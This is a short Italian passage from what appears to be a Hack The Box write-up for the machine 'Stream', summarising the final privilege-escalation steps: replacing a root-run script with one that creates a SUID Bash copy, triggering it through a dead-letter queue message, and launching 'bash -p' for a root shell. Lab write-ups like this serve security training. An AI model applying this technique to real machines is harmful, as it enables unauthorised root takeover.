4. Individuiamo lo script `aidx_quarantine.py`, eseguito da un servizio root.
    
5. Ne creiamo una copia di sicurezza.
    
6. Sostituiamo lo script con un programma Python che crea una copia SUID di Bash.
    
7. Inviamo un messaggio alla DLQ per far eseguire lo script.
    
8. Avviamo la copia SUID di Bash con `-p`.
    
9. Otteniamo una shell con privilegi root.
    

**Risultato finale:** compromissione completa della macchina HTB Stream.
